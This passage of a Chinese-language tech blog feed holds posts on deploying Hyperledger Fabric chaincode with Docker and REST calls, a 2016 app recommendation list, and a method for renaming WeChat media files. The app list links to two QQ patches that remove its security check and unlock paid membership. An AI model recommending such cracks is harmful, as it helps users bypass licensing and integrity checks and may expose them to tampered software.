1,</span><br><span class="line">    &quot;chaincodeID&quot;:&#123;</span><br><span class="line">        &quot;path&quot;: &quot;github.com/chaincode_example02&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;ctorMsg&quot;: &#123;</span><br><span class="line">        &quot;args&quot;:[&quot;init&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;secureContext&quot;: &quot;jim&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: &#123;</span><br><span class="line">    &quot;status&quot;: &quot;OK&quot;,</span><br><span class="line">    &quot;message&quot;: &quot;28a49ca95eb0e0dbf3ee7e41ff2172c174b13aa1539db3c4977bb0b7a78d26cb4a0ea26252358ddc184f8d44172af1284dc3f914caa13ccd2137611c70059b59&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记下 <code>message</code> 字段，在后续调用、查询链码的时候填入 <code>name</code> 字段。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这种部署方法与单 VP 节点节点中编译运行部署差别：</p><ol><li>REST API 部署的 JSON 数据 <code>chaincodeID</code> 字段不同，这里为 <code>path</code>，是链码在容器中的路径；单 VP 节点部署时 <code>chaincodeID</code> 内字段为 <code>name</code>，是链码编译后的可执行文件名；</li><li>单 VP 节点部署是为了调试链码，做法是把链码复制到 VP 节点中并编译，通过 <code>CORE_CHAINCODE_ID_NAME=mycc CORE_PEER_ADDRESS=0.0.0.0:7051 ./chaincode_example02</code> 命令运行链码，在终端中查看调试信息，使用 REST API 完成部署操作；本文是把链码复制到 Root VP 节点中，使用 REST API 部署时广播到区块链网络中所有 VP 节点，自行编译链码。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-说明&quot;&gt;&lt;a href=&quot;#0x00-说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 说明&quot;&gt;&lt;/a&gt;0x00 说明&lt;/h2&gt;&lt;p&gt;上篇文章《&lt;a href=&quot;https://g2ex.github.io/2016/11/26/Fa
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Fabric" scheme="https://g2ex.top/tags/Fabric/"/>
    
      <category term="Hyperledger" scheme="https://g2ex.top/tags/Hyperledger/"/>
    
  </entry>
  
  <entry>
    <title>2016 应用推荐</title>
    <link href="https://g2ex.top/2017/01/01/2016-App-List/"/>
    <id>https://g2ex.top/2017/01/01/2016-App-List/</id>
    <published>2017-01-01T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务类"><a href="#服务类" class="headerlink" title="服务类"></a>服务类</h2><ul><li>文件同步<ul><li>Dropbox</li><li><a href="https://www.jianguoyun.com" target="_blank" rel="noopener">坚果云</a></li></ul></li><li>照片备份<ul><li>Google 相册</li></ul></li><li>笔记与便签<ul><li>OneNote</li><li>Google Keep</li></ul></li><li>RSS<ul><li><a href="https://www.inoreader.com/" target="_blank" rel="noopener">Inoreader</a></li></ul></li></ul><hr><h2 id="Android-App-List"><a href="#Android-App-List" class="headerlink" title="Android App List"></a>Android App List</h2><ul><li>科学上网<ul><li>Shadowsocks</li></ul></li><li>Google 系列<ul><li>Photo、Keep、地图、街景、地球、日历、翻译、Youtube、照片扫描仪、Google 拼音、环聊、Play 商店</li></ul></li><li>Root 系列<ul><li>市场解锁、SD Maid、MiXplorer</li></ul></li><li>工具类<ul><li>ML Manager</li><li>KeePassDroid</li><li>Hi-Q MP3 RECORDER</li><li>Inoreader</li><li>OneNote</li><li>讯飞语记</li></ul></li></ul><hr><h2 id="iOS-App-List"><a href="#iOS-App-List" class="headerlink" title="iOS App List"></a>iOS App List</h2><ul><li>科学上网<ul><li>Wingy</li></ul></li><li>Google 系列<ul><li>Photo …</li></ul></li><li>…</li></ul><hr><h2 id="Windows-软件"><a href="#Windows-软件" class="headerlink" title="Windows 软件"></a>Windows 软件</h2><ul><li>科学上网<ul><li>Shadowsocks</li><li><a href="https://github.com/getlantern/lantern" target="_blank" rel="noopener">Lantern</a></li></ul></li><li>浏览器<ul><li>Chrome - <a href="https://www.google.com/chrome/browser/desktop/index.html?hl=zh-CN&standalone=1" target="_blank" rel="noopener">离线包</a><ul><li>扩展：印象笔记·剪藏、uBlock Origin、Proxy SwitchyOmega、Markdown Here、Tampermonkey、Vimium、搜索直达</li><li>应用：Journey、Postman</li></ul></li><li>Firefox - <a href="https://www.mozilla.org/en-US/firefox/all/" target="_blank" rel="noopener">离线包</a><ul><li>扩展：DownThemAll!、FoxyProxy Standard、uBlock Origin、Greasemonkey</li></ul></li><li>360 极速浏览器</li></ul></li><li>截图<ul><li><a href="http://www.faststone.org/FSCaptureDetail.htm" target="_blank" rel="noopener">FastStone Capture</a></li><li><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">Snipaste</a></li></ul></li><li>图片浏览/处理<ul><li><a href="http://www.irfanview.com/" target="_blank" rel="noopener">IrfanView</a></li><li><a href="http://www.steelbytes.com/?mid=30" target="_blank" rel="noopener">Stripper</a> - 去掉图片中的EXIF信息，可删除PS等修改记录</li></ul></li><li>GIF 录制<ul><li><a href="https://screentogif.codeplex.com/" target="_blank" rel="noopener">ScreentoGif</a></li></ul></li><li>视频播放<ul><li><a href="https://potplayer.daum.net/" target="_blank" rel="noopener">PotPlayer</a></li><li><a href="http://www.codecguide.com/download_kl.htm" target="_blank" rel="noopener">K-Lite Codec Pack</a></li></ul></li><li>PDF 阅读<ul><li>Adobe 系列</li><li><a href="http://blog.kowalczyk.info/software/sumatrapdf/free-pdf-reader.html" target="_blank" rel="noopener">Sumatra PDF</a></li></ul></li><li>编辑器<ul><li><a href="https://notepad-plus-plus.org/" target="_blank" rel="noopener">Notepad++</a></li><li><a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime Text</a></li><li><a href="https://code.visualstudio.com/download" target="_blank" rel="noopener">Visual Studio Code</a></li></ul></li><li>思维导图<ul><li><a href="http://www.xmind.net/" target="_blank" rel="noopener">XMind</a></li><li><a href="http://freemind.sourceforge.net/" target="_blank" rel="noopener">FreeMind</a></li><li><a href="http://www.mindlyapp.com/" target="_blank" rel="noopener">Mindly</a> - Android / iOS</li></ul></li><li>密码保存<ul><li><a href="http://keepass.info/" target="_blank" rel="noopener">Keepass</a></li></ul></li><li>文件查找<ul><li><a href="https://www.voidtools.com/" target="_blank" rel="noopener">Everything</a></li><li><a href="https://www.duplicatecleaner.com/" target="_blank" rel="noopener">Duplicate Cleaner</a></li><li><a href="http://www.uderzo.it/main_products/space_sniffer/" target="_blank" rel="noopener">SpaceSniffer</a></li></ul></li><li>翻译取词<ul><li>Google 翻译</li></ul></li><li>日记<ul><li><a href="https://2appstudio.com/journey/" target="_blank" rel="noopener">Journey</a></li><li><a href="http://www.haoxg.net/ediary/" target="_blank" rel="noopener">eDiary</a></li></ul></li><li>系统工具<ul><li><a href="http://processhacker.sourceforge.net/" target="_blank" rel="noopener">Process Hacker</a> - 强大的Windows资源管理器</li><li><a href="http://www.xuetr.com/?p=191" target="_blank" rel="noopener">PCHunter</a></li></ul></li><li>远程协助<ul><li><a href="http://mobaxterm.mobatek.net/" target="_blank" rel="noopener">TeamViewer</a></li></ul></li><li>SSH 工具<ul><li><a href="http://mobaxterm.mobatek.net/" target="_blank" rel="noopener">MobaXterm</a></li></ul></li><li>QQ<ul><li><a href="http://www.zdfans.com/589.html" target="_blank" rel="noopener">QQ 去整体安全校验补丁</a></li><li><a href="http://www.zdfans.com/583.html" target="_blank" rel="noopener">SVIP 超级会员补丁</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;服务类&quot;&gt;&lt;a href=&quot;#服务类&quot; class=&quot;headerlink&quot; title=&quot;服务类&quot;&gt;&lt;/a&gt;服务类&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;文件同步&lt;ul&gt;
&lt;li&gt;Dropbox&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.jianguoyu
      
    
    </summary>
    
      <category term="Software" scheme="https://g2ex.top/categories/Software/"/>
    
    
  </entry>
  
  <entry>
    <title>优雅地备份微信图片和视频</title>
    <link href="https://g2ex.top/2016/12/21/Backup-Wechat-Pictures-and-Videos/"/>
    <id>https://g2ex.top/2016/12/21/Backup-Wechat-Pictures-and-Videos/</id>
    <published>2016-12-21T20:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文针对 Android 平台的微信应用。</p><p>一般来说，手机闪存的路径为 <code>storage/emulated/0/</code>，微信文件夹位于闪存的 <code>Tencent/MicroMsg/</code> 目录下。</p><p>在 <code>Tencent/MicroMsg/</code> 目录下，有一个由字母和数字组成的长度为 32 字节的文件夹，消息里的图片和视频都会保存到这个文件夹中；</p><p>当你在微信聊天中长按图片或视频点击「保存」时，这些图片或视频又会被保存到 <code>Tencent/MicroMsg/</code> 目录下的 <code>WeiXin</code> 文件夹中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Tencent</span><br><span class="line">├─MicroMsg</span><br><span class="line">│    ├─由32个字母和数字组成的目录</span><br><span class="line">│    │    ├─image2  &lt;-- 消息中的图片保存位置</span><br><span class="line">│    │    │      ...</span><br><span class="line">│    │    │</span><br><span class="line">│    │    ├─video   &lt;-- 消息中的视频保存位置，包括自己录制的小视频</span><br><span class="line">│    │    │      191538241116e34a53c87982.jpg  &lt;-- 对应小视频的缩略图</span><br><span class="line">│    │    │      191538241116e34a53c87982.mp4</span><br><span class="line">│    │    │      202131031216e34a53c197510.jpg &lt;-- 对应小视频的缩略图</span><br><span class="line">│    │    │      202131031216e34a53c197510.mp4</span><br><span class="line">│    │    │      ...</span><br><span class="line">│    │    └─...</span><br><span class="line">│    ├─WeiXin</span><br><span class="line">│    │    │  1482227010527.mp4            &lt;-- 手动保存的小视频</span><br><span class="line">│    │    │  mmexport1482227010527.jpg    &lt;-- 手动保存的图片</span><br><span class="line">│    │    │  wx_camera_1482227020527.mp4  &lt;-- 自己拍摄的微信视频</span><br><span class="line">│    │    │  ...</span><br><span class="line">│    │    │</span><br><span class="line">│    │    └─...</span><br><span class="line">│    └─...</span><br><span class="line">└─...</span><br></pre></td></tr></table></figure><p>对于想备份的视频和图片，文件名看似杂乱无章，也不好区分个时间。如果像 Dropbox 备份的规则一样，把文件名改为 <code>2016-12-21 12:30:55.jpg</code> 这样多好啊！</p><h2 id="接下来，重命名"><a href="#接下来，重命名" class="headerlink" title="接下来，重命名"></a>接下来，重命名</h2><p>其实 <code>WeiXin</code> 和 <code>video</code> 两个文件夹下的文件命名是有规则的。</p><ol><li><p>重命名 <code>WeiXin</code> 文件夹下的文件</p><p><code>WeiXin</code> 文件夹下手动保存的视频文件其实是由 Unix 时间戳来命名的，<code>1482227010527</code> 转换为可读时间为 <code>2016/12/20 17:43:30</code>。图片文件无非就是在这个时间戳上又加了个 <code>mmexport</code> 前缀，自己拍摄的视频文件加了 <code>wx_camera_</code> 前缀。</p><p>但是，手动保存的视频和图片的时间戳是你保存那一刻的时间，不是你收到这个图片或视频那一刻的时间。好吧，如果不在意这个时间的话，那就写个 <a href="https://github.com/gymgle/gnotes/blob/master/Python/rename_with_unix_time.py" target="_blank" rel="noopener">Python 脚本</a> 重命名吧。</p></li><li><p>重命名 <code>video</code> 文件夹下的文件</p><p><code>video</code> 文件夹下图片和视频是成对存在的，同名的图片是视频的缩略图。如果发现只有一个图片而没有对应的视频，那是因为你在微信聊天中长按删除了视频。</p><p>这些视频和缩略图的命名也是有规则的，以 <code>191538241116e34a53c87982.mp4</code> 为例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">19 15 38 24 11 16 e34a53c87982.mp4</span><br><span class="line">%H %M %S %d %m %y</span><br><span class="line">翻译过来就是：</span><br><span class="line">2016-11-24 19.15.38</span><br><span class="line">这个时间是你收到小视频那一刻的时间</span><br></pre></td></tr></table></figure></li></ol><p>  因为 <code>video</code> 中包含了微信聊天中收到的所有小视频，所以 <code>WeiXin</code> 文件夹下的视频是它的一个子集。而且！<strong>这里的小视频时间戳可以认为就是录制时的时间。</strong> 对于强迫症的我们，这是多么值得激动的事情！赶紧写个 <a href="https://github.com/gymgle/gnotes/blob/master/Python/rename_wechat_video.py" target="_blank" rel="noopener">Python 脚本</a> 重命名吧！</p><hr><p>以后备份，就可以只用备份微信 <code>video</code> 下的视频和 <code>WeiXin</code> 下的图片了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;本文针对 Android 平台的微信应用。&lt;/p&gt;
&lt;p&gt;一般来说，手机闪存的路径为 &lt;code&gt;storage/emulated/0/&lt;/
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="Wechat" scheme="https://g2ex.top/tags/Wechat/"/>
    
  </entry>
  
  <entry>
    <title>Fabric 单节点部署与链码测试</title>
    <link href="https://g2ex.top/2016/11/26/Fabric-Deployment-and-Chaincode-Setup/"/>
    <id>https://g2ex.top/2016/11/26/Fabric-Deployment-and-Chaincode-Setup/</id>
    <published>2016-11-26T23:25:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-说明"><a href="#0x00-说明" class="headerlink" title="0x00 说明"></a>0x00 说明</h2><p>作为区块链平台 fabric 项目的代码贡献者，IBM 在自己的 Bluemix 上提供了免费的区块链服务。在该服务中，我们可以一键创建 4 个认证节点的区块链网络，使用 REST API 方便地测试自己的 fabric 链码而不用在本地部署 fabric 区块链网络。</p><p><strong>为什么要本地部署 fabric？</strong></p><ol><li>在 Bluemix 上部署链码，需要把链码提交到 Github 上。在编写链码过程中，需要多次测试，每次都要上传到 Github。而本地部署链码只需要把链码在本地 Docker 中的认证节点上注册即可，不需多次上传 Github；</li><li>可以方便地查看链码的打印日志；</li><li>最近编写和测试链码的过程中，发现 Bluemix 提供的 fabric 服务中对链码方法参数的长度判断与本地部署 fabric 有所差异。目前在做的项目区块链网络最终要部署在本地。</li></ol><p>在上一篇文章<a href="https://g2ex.github.io/2016/10/14/Deploy-Hyperledger-Fabric-with-Docker/" target="_blank" rel="noopener">《Ubuntu 中使用 Docker 部署 Hyperledger fabric》</a>中，总结了本地基于 Docker 的一键式部署方案，Docker 使用的镜像是由 <a href="http://yeasy.github.io/" target="_blank" rel="noopener">Baohua Yang</a> 构建。本文中总结使用 fabric 官方的 Docker 镜像在本地部署区块链平台，并在认证节点中注册链码（以 fabric <a href="https://github.com/hyperledger/fabric/tree/master/examples/chaincode/go/chaincode_example02" target="_blank" rel="noopener">示例链码 02</a> 为例），使用 REST API 与链码交互。</p><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h3><blockquote><p>参照 <a href="https://docs.docker.com/engine/installation/linux/ubuntulinux/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/linux/ubuntulinux/</a></p></blockquote><p>这里以 <code>Ubuntu 16.04 LTS</code> 为例：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加 PGP Key</span></span><br><span class="line">sudo apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加更新源，其他 Linux 发行版请参照上面链接更换相应更新源</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"deb https://apt.dockerproject.org/repo ubuntu-xenial main"</span> | sudo tee /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Docker</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-engine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立 docker 组</span></span><br><span class="line"><span class="comment"># 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组</span></span><br><span class="line">$ sudo groupadd docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前用户加入 docker 组</span></span><br><span class="line">$ sudo usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><h3 id="安装-docker-compose"><a href="#安装-docker-compose" class="headerlink" title="安装 docker-compose"></a>安装 docker-compose</h3><blockquote><p>参照 <a href="https://yeasy.gitbooks.io/docker_practice/content/compose/intro.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/compose/intro.html</a></p></blockquote><p>Docker-compose 可以很方便地实现 fabric 的一键部署。</p><p>因为 Ubuntu 仓库中的 docker-compose 版本较低，建议到 <a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">这里</a> 自己下载最新版，此时最新版为 <code>1.9.0</code>。</p><p>以下命令使用 root 权限执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ su <span class="comment"># 使用 root 权限</span></span><br><span class="line">$ curl -L https://github.com/docker/compose/releases/download/1.9.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">$ chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><h3 id="获取官方-fabric-镜像"><a href="#获取官方-fabric-镜像" class="headerlink" title="获取官方 fabric 镜像"></a>获取官方 fabric 镜像</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull hyperledger/fabric-peer:latest</span><br><span class="line">$ docker pull hyperledger/fabric-membersrvc:latest</span><br></pre></td></tr></table></figure><h2 id="0x02-启动-fabric-与测试链码"><a href="#0x02-启动-fabric-与测试链码" class="headerlink" title="0x02 启动 fabric 与测试链码"></a>0x02 启动 fabric 与测试链码</h2><blockquote><p>参考 <a href="https://github.com/hyperledger/fabric/blob/master/docs/Setup/Chaincode-setup.md" target="_blank" rel="noopener">https://github.com/hyperledger/fabric/blob/master/docs/Setup/Chaincode-setup.md</a></p></blockquote><h3 id="启动-fabric"><a href="#启动-fabric" class="headerlink" title="启动 fabric"></a>启动 fabric</h3><p>把以下内容保存到 <code>docker-compose.yml</code> 文件，使用 <code>docker-compose up</code> 命令启动一个认证节点和成员管理服务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">membersrvc:</span><br><span class="line">  image: hyperledger/fabric-membersrvc</span><br><span class="line">  <span class="built_in">command</span>: membersrvc</span><br><span class="line">vp0:</span><br><span class="line">  image: hyperledger/fabric-peer</span><br><span class="line">  environment:</span><br><span class="line">    - CORE_PEER_ADDRESSAUTODETECT=<span class="literal">true</span></span><br><span class="line">    - CORE_VM_ENDPOINT=http://172.17.0.1:2375</span><br><span class="line">    - CORE_LOGGING_LEVEL=DEBUG</span><br><span class="line">    - CORE_PEER_ID=vp0</span><br><span class="line">    - CORE_PEER_PKI_ECA_PADDR=membersrvc:7054</span><br><span class="line">    - CORE_PEER_PKI_TCA_PADDR=membersrvc:7054</span><br><span class="line">    - CORE_PEER_PKI_TLSCA_PADDR=membersrvc:7054</span><br><span class="line">    - CORE_SECURITY_ENABLED=<span class="literal">true</span></span><br><span class="line">    - CORE_SECURITY_ENROLLID=test_vp0</span><br><span class="line">    - CORE_SECURITY_ENROLLSECRET=MwYpmSRjupbT</span><br><span class="line">  links:</span><br><span class="line">    - membersrvc</span><br><span class="line">  <span class="built_in">command</span>: sh -c <span class="string">"sleep 5; peer node start --peer-chaincodedev"</span></span><br></pre></td></tr></table></figure><h3 id="在节点上注册链码"><a href="#在节点上注册链码" class="headerlink" title="在节点上注册链码"></a>在节点上注册链码</h3><p>进入 docker，在认证节点上注册链码，后续与链码交互过程中，可以在终端中查看链码的打印日志。</p><p>查看 docker 中当前进程：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID        IMAGE                           COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">4e864338032e        hyperledger/fabric-peer         <span class="string">"sh -c 'sleep 5; peer"</span>   54 minutes ago      Up 54 minutes                           fabricdockercompse_vp0_1</span><br><span class="line">92e4c255c47b        hyperledger/fabric-membersrvc   <span class="string">"membersrvc"</span>             54 minutes ago      Up 54 minutes                           fabricdockercompse_membersrvc_1</span><br></pre></td></tr></table></figure><p>这时，可以使用 <code>docker cp</code> 命令把链码复制到节点中：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp chaincode_example02.go mycontainer:/opt/gopath/src/github.com/chaincode_example02/chaincode_example02.go</span><br></pre></td></tr></table></figure><p>进入认证节点，启动节点的终端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -t 选项让 docker 分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， -i 则让容器的标准输入保持打开</span><br><span class="line">docker exec -it fabricdockercompse_vp0_1 bash</span><br></pre></td></tr></table></figure><p>编译链码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/github.com/chaincode_example02</span><br><span class="line">go build</span><br></pre></td></tr></table></figure><p>在节点上注册链码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mycc 为自定义链码的 ID，后续与链码交互时会用到</span></span><br><span class="line"><span class="comment"># chaincode_example02 为编译后的链码可执行文件</span></span><br><span class="line">CORE_CHAINCODE_ID_NAME=mycc CORE_PEER_ADDRESS=0.0.0.0:7051 ./chaincode_example02</span><br></pre></td></tr></table></figure><h3 id="使用-REST-与链码交互"><a href="#使用-REST-与链码交互" class="headerlink" title="使用 REST 与链码交互"></a>使用 REST 与链码交互</h3><p>使用 Postman 或类似工具完成下面的测试。</p><p>用户登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST http://172.17.0.3:7050/registrar</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;enrollId&quot;: &quot;jim&quot;,</span><br><span class="line">  &quot;enrollSecret&quot;: &quot;6avZQLwcUe9b&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署链码，会调用链码的 <code>Init()</code> 方法，创建 a、b 两个角色，余额分别为 100 和 200 单位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://172.17.0.3:7050/chaincode</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;deploy&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: 1,</span><br><span class="line">    &quot;chaincodeID&quot;:&#123;</span><br><span class="line">      &quot;name&quot;: &quot;mycc&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;ctorMsg&quot;: &#123;</span><br><span class="line">       &quot;args&quot;:[&quot;init&quot;, &quot;a&quot;, &quot;100&quot;, &quot;b&quot;, &quot;200&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;secureContext&quot;: &quot;jim&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 a 向 b 转账 10 个单位，会调用链码的 <code>Invoke()</code> 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://172.17.0.3:7050/chaincode</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;invoke&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: 1,</span><br><span class="line">      &quot;chaincodeID&quot;:&#123;</span><br><span class="line">        &quot;name&quot;:&quot;mycc&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;ctorMsg&quot;: &#123;</span><br><span class="line">        &quot;args&quot;:[&quot;invoke&quot;, &quot;a&quot;, &quot;b&quot;, &quot;10&quot;]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;secureContext&quot;: &quot;jim&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;id&quot;: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询 a 的余额，会调用链码的 <code>Query()</code> 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://172.17.0.3:7050/chaincode</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;query&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: 1,</span><br><span class="line">      &quot;chaincodeID&quot;:&#123;</span><br><span class="line">        &quot;name&quot;:&quot;mycc&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;ctorMsg&quot;: &#123;</span><br><span class="line">        &quot;args&quot;:[&quot;query&quot;, &quot;a&quot;]</span><br><span class="line">      